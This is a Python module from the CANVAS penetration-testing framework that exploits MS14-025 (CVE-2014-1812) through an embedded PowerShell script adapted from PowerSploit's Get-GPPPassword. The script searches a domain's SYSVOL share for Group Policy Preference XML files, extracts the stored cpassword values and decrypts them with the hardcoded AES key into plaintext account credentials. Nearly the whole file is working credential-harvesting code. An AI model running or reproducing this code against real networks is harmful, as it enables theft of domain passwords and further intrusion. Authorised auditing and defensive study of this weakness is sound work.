#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import socket
import locale
from tempfile import NamedTemporaryFile
from exploitutils import *

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

import canvasengine

NAME                            = "ms14_025"
DESCRIPTION                     = "Check for insecure password storage in AD using a PowerShell node"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION["VENDOR"]         = "Microsoft"
DOCUMENTATION['Date public']    = '05/13/2014'
DOCUMENTATION['CVE Name']       = 'CVE-2014-1812'
DOCUMENTATION['CVE Url']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1812'
DOCUMENTATION['References']     = 'https://technet.microsoft.com/library/security/ms14-025'
DOCUMENTATION["Commandline"]    = "runmodule ms14-025"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = ['Vista', '7', '8', '8.1', '2008', '2012']
PROPERTY['MS PATCHES']          = ["KB2928120", "KB2919355"]

DOCUMENTATION['NOTES']          = """
Must be run through a PowerShell Node. Uses PowerSploit Function: Get-GPPPassword
created by Chris Campbell and used under BSD 3-Clause License"

Client systems are only affected if Remote Server Administration Tools has
been installed:
- Windows Vista SP2
- Windows Vista SP2 x64
- Windows 7 SP1
- Windows 7 SP1 x64
- Windows 8
- Windows 8 x64
- Windows 8.1
- Windows 8.1 x64

Server systems are only affected if Group Policy Management is configured on
the server:
- Windows Server 2008 SP2
- Windows Server 2008 SP2 x64
- Windows Server 2008 R2
- Windows Server 2012
- Windows Server 2012 R2
- Windows Server 2008
"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.computer       = ""
        return


    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        ret = False
        # runpowershellscript need a file to upload, it doesn't receive a buffer yet. So we have to comply with a tmp file
        for node in self.argsDict["passednodes"]:
            ntype = node.nodetype
            shell = node.shell
            if ntype == "PowerShellNode":
                tfile  = self.getpowershellfile()
                runpow = canvasengine.getModuleExploit("runpowershellscript")
                runpow.link(self)
                runpow.argsDict["filename"]   = tfile.name
                runpow.argsDict["copytodisk"] = False
                ret = runpow.run()
                users = []
                for a in runpow.result.replace("\r\n", "").split("***"):
                    a = string.strip(a)
                    if a:
                        users += [ a.split("@##@") ]
                self.result = users

                self.setInfo("%s - done (success)" % NAME)
                return True
            else:
                logging.info("Node not supported. This module only runs on a PowerShell node")
                self.setInfo("%s - done (failed)" % NAME)
        return ret

    def getpowershellfile(self):

        powershellfile = """

    function Get-DecryptedCpassword {
        [CmdletBinding()]
        Param ( [string] $Cpassword )
        try {
            $Mod = ($Cpassword.length % 4)
            switch ($Mod) {
             '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
             '2' {$Cpassword += ('=' * (4 - $Mod))}
             '3' {$Cpassword += ('=' * (4 - $Mod))}
             }
            $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            }
        catch {
            Write-Error $Error[0]
            }
        }

    function Get-GPPInnerFields {
    [CmdletBinding()]
        Param ($File)
        try {
            $Filename = Split-Path $File -Leaf
            [xml] $Xml = Get-Content ($File)
            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()
            if ($Xml.innerxml -like "*cpassword*"){
                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }}}
           foreach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               $Password += , $DecryptedPassword  }
            if (!($Password)) {$Password = '[BLANK]'}
            if (!($UserName)) {$UserName = '[BLANK]'}
            if (!($Changed)) {$Changed = '[BLANK]'}
            if (!($NewName)) {$NewName = '[BLANK]'}
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}
            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Output 'The password is between {} and may be more than one value.'
            if ($ResultsObject) {Return $ResultsObject}
            }
        catch {Write-Error $Error[0]}
        }

    $ErrorActionPreference = "SilentlyContinue"
    try {
        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
            throw 'Machine is not a domain member or User is not a member of the domain.'
        }
        $XMlFiles = Get-ChildItem -Path "\\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
        if ( -not $XMlFiles ) {throw 'No preference files found.'}
        foreach ($File in $XMLFiles) {
            $Result = (Get-GppInnerFields $File.Fullname)
            Write-Output $Result
        }
    }
    catch {Write-Output 'No passwords found'}
        """

        tfile = NamedTemporaryFile("w+b", suffix=".ps1", bufsize=0)
        tfile.write(powershellfile)
        return tfile

